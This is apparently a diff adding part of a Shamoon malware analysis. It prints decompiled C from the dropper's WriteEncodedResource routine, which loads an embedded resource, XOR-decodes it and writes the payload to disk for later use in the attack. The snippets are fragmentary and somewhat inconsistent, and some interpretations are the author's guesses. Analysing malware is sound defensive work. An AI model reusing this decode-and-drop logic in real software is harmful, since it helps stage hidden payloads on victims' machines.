@@ -497,3 +497,53 @@ Responsible for the decoding of files. Includes the function
 ```
 bool WriteEncodedResource(LPCWSTR szFileName, HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType, char *vKey, UINT32 nKeyLength);
 ```
+The function first gets the resources and copies the values into local char*. The files are seemingly obtained from the hModule (Handler module), indicating that this is the transfer of malicious files to the remote target
+```
+HRSRC hResource; // eax@1
+HGLOBAL hgResource; // eax@2
+char *pRsrcData; // [sp+10h] [bp-18h]@3
+
+// Get the pointer to the resource
+CHECK_AND_COPY_VALUE(hResource	, FindResourceW(hModule, lpName, lpType))
+CHECK_AND_COPY_VALUE(hgResource	, LoadResource(hModule, hResource))
+CHECK_AND_COPY_VALUE(pRsrcData	, (char *)LockResource(hgResource))
+	
+// Get the size of the resource
+DWORD dwRsrcSize = SizeofResource(hModule, hResource);
+```
+
+The file is then open and proceeds to be decoded, decoding the first 1024 bytes individually, then decodes directly. My assumption for 
+this is preventing against the possibility of a corrupted file, which is why it's done byte by byte and not in chunks of 10 or 15 bytes.
+```
+UINT32 i = 0;
+	DWORD dwBytesWritten = 0;
+	
+	while(i < dwRsrcSize)
+	{
+		// Decode the first 1024 bytes byte by byte
+		UINT8 nDecodedByte = pRsrcData[i] ^ vKey[i % nKeyLength];
+		WriteFile(hFile, &nDecodedByte, 1, &dwBytesWritten, 0);
+		
+		++i;
+		
+		// If the file is more than 1024 bytes long, decode it directly
+		if(i >= 1024)
+		{
+			// If the file is exactly 1024 bytes long, break the routine
+			if(i >= dwRsrcSize)
+				break;
+```
+
+Virtual memory is then allocated for the data to be sent to once decoded
+```
+UINT8 *pRawData = (UINT8 *)VirtualAlloc(NULL, dwRsrcSize - i, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+if(!pRawData)
+	break;
+```
+
+The decoded bytes are written to a file which will then be used later in the attack 
+```
+WriteFile(hFile, pRawData, dwRsrcSize - 1024, &dwBytesWritten, 0);
+```
+
+That marks the end of the Shamoon malware. It is not entirely clear how similar SHAPESHIFT is to Shamoon, but all reports (by FireEye and Kaspersky) indicate that they are extremely similar, with the DROPSHOT/SHAPESHIFT attack being more sophisticated than the earlier Shamoon.
